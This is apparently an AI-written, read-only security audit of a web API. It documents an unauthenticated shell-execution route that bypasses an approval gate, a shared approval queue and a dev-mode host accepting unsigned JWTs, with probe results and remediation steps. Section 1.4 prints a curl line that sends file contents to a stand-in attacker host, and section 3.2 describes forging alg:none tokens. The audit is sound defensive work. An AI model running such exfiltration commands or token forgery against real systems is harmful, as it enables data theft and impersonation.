# AUTHORIZATION-BOUNDARY-01 — unauthenticated tool execution and the approval gate

**Trigger:** RECONCILIATION-01 §4.4 recorded that `/api/approvals/*` carry no
`require_auth` dependency and that `approve` executes a tool. This is the
follow-up investigation that finding demanded.

**Status:** read-only investigation. No implementation was modified. All probes
were non-destructive (read-only tools, non-existent tool names, or payloads the
inner guardrails reject).

**Headline.** The approval gate is not merely unprotected — it is **bypassable**.
`POST /api/tools/{tool_name}/run` invokes any registered tool with **no
authentication at all** and **never consults `requires_approval`**. I confirmed
anonymous remote command execution on the live deployment.

---

## 0. Method and safety

- **Environment:** `https://work-1-ebzexyppcbabiatu.prod-runtime.all-hands.dev`
  (the [L] host from RECONCILIATION-01). `ENVIRONMENT` and credential state were
  not directly inspected; behaviour was inferred from responses.
- **Evidence classes:** CODE (file:line), PROBE (live HTTP), INFER (reasoning).
- **Non-destructive constraint.** Every probe used one of:
  - a read-only tool (`list_directory`, `read_file`, `whoami`);
  - a non-existent tool name (proves the route is reachable without side effect);
  - a payload the tool's own guardrails reject (`/etc/passwd` read, `python3`
    shell command, write outside approved dirs).
  No file was created or overwritten, no destructive command was run, and all
  probe state was cleaned up (§5).

---

## 1. The core finding — `/api/tools/{tool_name}/run` is an unauthenticated executor

### 1.1 Code

`api/main.py` L2147-2162:

```python
@app.post("/api/tools/{tool_name}/run")          # <-- no Depends(require_auth)
async def run_tool_endpoint(tool_name: str, request: Request):
    ...
    tool = _tools.get_tool(tool_name)
    if tool is None:
        raise HTTPException(status_code=404, detail=f"Tool '{tool_name}' not found")
    result = tool.run(payload)                   # <-- invoked directly
    return result
```

The route has **no authentication dependency**, and it **never reads
`requires_approval`**. `ExecuteShellTool.requires_approval = True`
(`kernel/tools_real.py` L225) and `WriteFileTool.requires_approval = True`
(L359) are declared but ignored by this caller. The approval machinery in
`api/approval_routes.py` exists and works — it is simply optional.

Tools are registered at startup (`api/main.py` L177-180 →
`register_real_tools()`), so the live deployment exposes all nine:
`execute_shell`, `write_file`, `read_file`, `list_directory`, `generate_image`,
`generate_images`, `generate_verse`, `log_transaction`, `update_open_loops`
(`GET /api/tools`, PROBE, count=9).

### 1.2 Probes — anonymous

| # | Request | Result | Meaning |
|---|---|---|---|
| 1 | `GET /api/tools` | 200, 9 tools | registry enumerated anonymously |
| 2 | `POST /api/tools/list_directory/run {"path":"."}` | 200, `status:"success"` | arbitrary directory listing, anon |
| 3 | `POST /api/tools/execute_shell/run {"command":"whoami"}` | 200, `stdout:"openhands"`, `exit_code:0` | **anonymous remote command execution** |
| 4 | `POST /api/tools/read_file/run {"path":"README.md"}` | 200, file contents | arbitrary read inside project root, anon |

Probe 3 verbatim:

```json
{"success":true,"results":[{"status":"success","command":"whoami",
 "exit_code":0,"stdout":"openhands\n","stderr":""}],
 "tool_used":"execute_shell","summary":"✓ execute_shell complete."}
```

**Finding.** An unauthenticated caller can execute shell commands, read files,
and write files on the substrate host. This is strictly broader than
RECONCILIATION-01's approvals finding, because it requires **no** approval
object at all.

### 1.3 The inner guardrails do hold

The tools' own validation is intact and correctly rejects:

| # | Probe | Result |
|---|---|---|
| 5 | `read_file {"path":"/etc/passwd"}` | refused: "outside the project root" |
| 6 | `write_file {"path":"api/main.py"}` | refused: "outside approved write directories" |
| 7 | `execute_shell {"command":"python3 -c ..."}` | refused: "'python3' is not in the shell execution allowlist" |

**Interpretation.** The blast radius is bounded by the tool allowlist
(16 read-only-ish commands, no interpreters, no `git`), the read containment
check, and the write-directory check. But that is *defence in depth behind a
missing perimeter*. A shell allowlist that includes `curl` and `wget` (present)
permits data exfiltration and SSRF; `write_file` inside `knowledge/`, `data/`,
`vault/` permits corrupting substrate state. The inner guards reduce impact;
they do not substitute for an authentication boundary.

### 1.4 Attack chain with no approval involved

```
POST /api/tools/execute_shell/run {"command":"curl http://attacker/?x=$(cat ...)"}
```

No token. No approval. No audit entry beyond the application log. This is the
finding that should gate everything else.

---

## 2. The approval gate is redundant, not protective

The approval flow works exactly as written — and is entirely bypassable.

### 2.1 Code

`api/approval_routes.py`:

| Route | Line | Auth dependency |
|---|---|---|
| `POST /api/approvals/request` | 44 | **none** |
| `GET /api/approvals` | 59 | **none** |
| `POST /api/approvals/{id}/approve` | 68 | **none** — executes a tool (L77-82) |
| `POST /api/approvals/{id}/reject` | 89 | **none** |

### 2.2 Probes — anonymous

| # | Probe | Result |
|---|---|---|
| 8 | queue approval for `__probe_nonexistent__` | 200, `approval_id` returned |
| 9 | list approvals | 200 — queue is **world-readable** |
| 10 | approve the non-existent-tool approval | 404 `Tool '__probe_nonexistent__' not found` — route reached, tool lookup is the only gate |
| 11 | reject it | 200 |
| 12 | queue approval for real read-only tool `list_directory` | 200, `approval_id` |
| 13 | approve it | 200, `status:"approved"`, `result` contains the directory listing |

Probe 13 verbatim (truncated):

```json
{"approval_id":"1349e7b2-37e","status":"approved",
 "result":{"success":true,"results":[{"status":"success",
 "path":"/workspace/.../relational-substrate","entries":[".env.example",...]}]}}
```

**Finding.** The full anonymous chain `request → list → approve → tool executes`
works. The queue holds *all* approvals in one global in-memory dict
(`PENDING_APPROVALS`, L18) with no per-user scoping, so any caller can enumerate
and decide any approval — including ones another actor queued. Probe 9 also
revealed **two pre-existing approvals** (`no_such_tool`, and a third) that were
not mine, confirming the queue is shared across callers.

### 2.3 The gate protects nothing

Because `/api/tools/{tool_name}/run` (PROBE 3) executes any tool without
authentication, the approval flow's only purpose — inserting a human decision
before a sensitive tool runs — is defeated by simply not using it. The
`HUMAN_ONLY: AUTHORIZE` doctrine is not enforced for either path.

---

## 3. Dev-mode is active on the live host

### 3.1 Code

`api/auth.py` `_init_firebase()` (L44-70): if `FIREBASE_SERVICE_ACCOUNT_JSON`
is absent **and** `ENVIRONMENT != "production"`, the module sets `_dev_mode=True`
and logs *"token signatures are NOT verified; local development only"*. In
dev-mode `get_current_user` decodes the JWT payload **without verifying the
signature** (L381-390) via `_decode_jwt_payload_unsafe`.

### 3.2 Probes

I minted an unsigned `alg:"none"` JWT with an arbitrary `sub`/`email`.

| # | Probe | Result | Meaning |
|---|---|---|---|
| 14 | `POST /api/lab/.../transition` anon | **401** | auth boundary enforced when absent |
| 15 | `GET /api/lab/engineering/sessions` anon | **401** | ditto |
| 16 | `GET /api/me` with unsigned token | **200** | **dev-mode confirmed** — signature not verified |
| 17 | `GET /api/lab/engineering/sessions` with unsigned token | **200** | unsigned token accepted as authenticated |
| 18 | `GET /api/nodes` with unsigned token | **403** | access_level resolved to 0 |
| 19 | `GET /api/me` with `not.a.jwt` | **401** | non-JWT is rejected (no crash) |

**Finding (INFER, high confidence).** The live host runs in **dev-mode**:
- Probe 16 can only return 200 if `verify_firebase_token` did not run (dev-mode
  short-circuits at L112).
- If dev-mode were *not* active, the initialiser would have raised a hard
  `RuntimeError` at startup in the absence of credentials — but the service is
  up. So credentials are absent and `ENVIRONMENT` is not `"production"`.

### 3.3 Authority cannot be forged through the token — but identity can

`build_user_profile` (`api/auth.py` L309-358) resolves `access_level` **only**
from a `node_key`/`arkadia_node` claim matched against `data/nodes_seed.json`.
The token's own `access_level` claim is ignored.

- `data/nodes_seed.json` contains **1 node at access_level 1**; no node at
  level ≥ 3 exists in the seed.
- PROBE 18 confirms: even claiming `access_level:3`, `/api/nodes` returned 403.

**So:** a dev-mode attacker can assume **any non-sovereign identity** (any `sub`)
but cannot reach sovereign (level ≥ 3) authority. Identity is forgeable;
the top-level authority tier is not — as long as the seed registry stays as it is.
This is a fragile property: it depends on the seed contents, not on an
enforcement mechanism.

### 3.4 Does this matter if the host is meant to be production?

Yes, and it should be resolved explicitly. If `ENVIRONMENT=production` is
intended, then either `FIREBASE_SERVICE_ACCOUNT_JSON` is missing (the guard is
not engaged) or dev-mode is otherwise reachable. Either way the deployment is
not meeting its own stated security contract (`api/auth.py` L39-52). This needs
a direct configuration check on the deployment, which I could not perform from
outside.

---

## 4. What *is* correctly enforced

The investigation is not uniformly negative. Three boundaries hold:

### 4.1 Forbidden transitions are enforced at runtime

`store.transition_session` (L246-259) calls `assert_transition_allowed`
(`contracts.py` L192-207) before every write, and that function fails closed on
`FORBIDDEN_DIRECT_TRANSITIONS`. All session state changes funnel through this
single guarded path (verified: the only callers are `runtime.transition` L301
and `runtime` L777).

| # | Probe | Expected | Result |
|---|---|---|---|
| 26 | `PROPOSED → COMPLETED` | rejected | 409 "illegal transition PROPOSED -> COMPLETED" |
| 27 | `PROPOSED → AUTHORIZED` | allowed | 200, state=AUTHORIZED |
| 28 | `AUTHORIZED → COMPLETED` | rejected (forbidden) | 409 "transition AUTHORIZED -> COMPLETED **collapses distinct states**; an intermediate state (e.g. VERIFYING/CHECKPOINTED) is required." |
| 29 | `QUEUED → COMPLETED` | rejected | 409 "illegal transition QUEUED -> COMPLETED" |

**This resolves RECONCILIATION-01 §1.4's open question.** The
`READY_FOR_REVIEW → COMPLETED` collapse is forbidden by the contract **and
enforced by the runtime**. The source frontend renders it as an ordinary step;
the substrate refuses it with the non-collapse message. Contract and runtime
agree; the interface is the outlier.

### 4.2 Ownership boundaries hold

`subject_ref = user["uid"]` scopes every lab query (`api/lab_routes.py` L119-149).
I created a session as `alice-probe` and attacked it as `bob-probe`:

| # | Probe | Result |
|---|---|---|
| 22 | alice lists sessions | count=1 |
| 23 | bob lists sessions | **count=0** |
| 24 | bob reads alice's session by id | **404** |
| 25 | bob transitions alice's session | **404** |

Ownership is enforced server-side. (Note: an unsigned dev token can *claim* to
be alice — see §3.3 — so this boundary is only as strong as token verification.)

### 4.3 The auth boundary works where it is applied

`/api/lab/*` (router-level `dependencies=[Depends(require_auth)]`, L45) and
`/api/nodes` return 401/403 anonymously (PROBES 14, 15, 18). The problem is not
that the mechanism is broken; it is that it is **not applied to the
highest-consequence routes**.

---

## 5. Cleanup

Probe state created during this investigation:

| Artifact | Action |
|---|---|
| approval `b597140a-3d1` (`__probe_nonexistent__`) | rejected (PROBE 11) |
| approval `1349e7b2-37e` (`list_directory`) | approved; read-only, no state change |
| agent (alice) | creation **failed** (invalid role) — none created |
| session `SES-a37efb0b2585` (alice) | transitioned to **ABORTED** (terminal) |

No files were written, no commands with side effects were run, and no
non-existent-tool approval was left pending.

---

## 6. Findings register

| ID | Finding | Class | Evidence | Severity |
|---|---|---|---|---|
| **AB-1** | `POST /api/tools/{tool_name}/run` executes any registered tool with **no authentication** and **ignores `requires_approval`** | backend | `api/main.py` L2147-2162; PROBE 3 (`whoami`→`openhands`, anon) | **critical** |
| **AB-2** | Anonymous shell execution enables data exfiltration/SSRF via allowlisted `curl`/`wget` | backend | `kernel/tools_real.py` L60-81; PROBE 3 | **critical** |
| **AB-3** | Approval queue is anonymous for read and decide; global (unscoped) in-memory state | backend | `api/approval_routes.py` L18, L44-97; PROBES 8-13 | **critical** |
| **AB-4** | `approve` executes a tool; the queue therefore grants execution, not just a decision | backend | L77-82; PROBE 13 | **critical** |
| **AB-5** | Approval gate is redundant: AB-1 bypasses it entirely | backend | §2.3 | **critical** |
| **AB-6** | `POST /api/goals` creates a goal + starts its scheduler with no auth | backend | `api/loop_routes.py` L78-96 | high |
| **AB-7** | `POST /api/agent/spawn` queues jobs / calls Gemini synchronously with no auth | backend | `api/main.py` L2219-2260 | high |
| **AB-8** | `POST /api/plan/run` plans and executes with no auth | backend | `api/main.py` L2169-2190 | high |
| **AB-9** | Live host runs in **dev-mode**; token signatures are not verified | deployment | `api/auth.py` L44-70, L381-390; PROBES 16-17 | high |
| **AB-10** | Dev-mode permits arbitrary **identity** claims (any `sub`), but not sovereign authority (seed has no level ≥ 3) | backend/deployment | `build_user_profile` L309-358; `nodes_seed.json`; PROBE 18 | medium |
| **AB-11** | Inner tool guardrails (shell allowlist, read containment, write-dir containment) **do** hold | backend | PROBES 5-7 | — (positive) |
| **AB-12** | Forbidden transitions **are** enforced at runtime via the single guarded transition path | backend | `contracts.py` L192-207; `store.py` L246-259; PROBES 26-29 | — (positive) |
| **AB-13** | Ownership boundaries **do** hold (cross-identity access → 404) | backend | `api/lab_routes.py` L119-149; PROBES 22-25 | — (positive) |

### Severity summary

- **4 critical**, all one root cause: *an execution surface was added without an
  authorization boundary, and the approval mechanism intended to guard it is
  optional.*
- **3 high**: adjacent unauthenticated mutation routes plus the dev-mode
  deployment question.
- **3 positive**: the governance contract, ownership scoping, and the inner tool
  guardrails are sound — which is precisely why the missing perimeter matters.
  The substrate got the *hard* governance semantics right and left the *front
  door* open.

---

## 7. Recommended remediation order

1. **Close AB-1 first.** Add `Depends(require_auth)` to
   `POST /api/tools/{tool_name}/run` and `GET /api/tools`, and make that route
   honour `requires_approval` (route sensitive tools through `queue_approval`
   instead of executing inline).
2. **Then AB-3/AB-4.** Add `require_auth` to all four `/api/approvals` routes
   and scope `PENDING_APPROVALS` by `subject_ref`; require an authorization tier
   above `require_auth` for `approve`/`reject`, since these execute tools.
3. **Then AB-6/7/8.** Apply `require_auth` to `/api/goals`, `/api/agent/spawn`,
   `/api/plan/run`.
4. **Resolve AB-9 explicitly.** Confirm whether the deployment is intended to be
   production. If so, provision `FIREBASE_SERVICE_ACCOUNT_JSON` (or set
   `ENVIRONMENT=production` and let the guard fail loudly). Do not leave a host
   that verifies no signatures serving anonymous tool execution.
5. **Re-run this probe suite** after each change; the suite is the acceptance
   test.

---

## 8. Bearing on the relational-substrate goal

The substrate preserves the distinction between *recording* an authorization and
*enforcing* one for governed sessions — `record_authorization` is separate from
`transition`, and the transition guard is real (§4.1). That is the right shape.

But the tool-execution surface collapses the very distinction the governance
model is built to preserve: `approve` records a decision *and* executes in the
same breath, and the execution can be reached without the decision. For a shared
relational graph across AI nodes, this is the failure mode to eliminate: if an
authorization is recorded but not required, every connected node can inherit the
same graph while making the same false assumption about authority. The fix is not
more doctrine — the doctrine is already correct and machine-checked. The fix is
to make the perimeter enforce what the contract declares.

---

*End of AUTHORIZATION-BOUNDARY-01. Read-only investigation; no implementation
was modified. Supersedes the severity assessment in RECONCILIATION-01 §4.4 by
adding the `/api/tools/{tool_name}/run` bypass (AB-1), which that artifact did
not reach.*
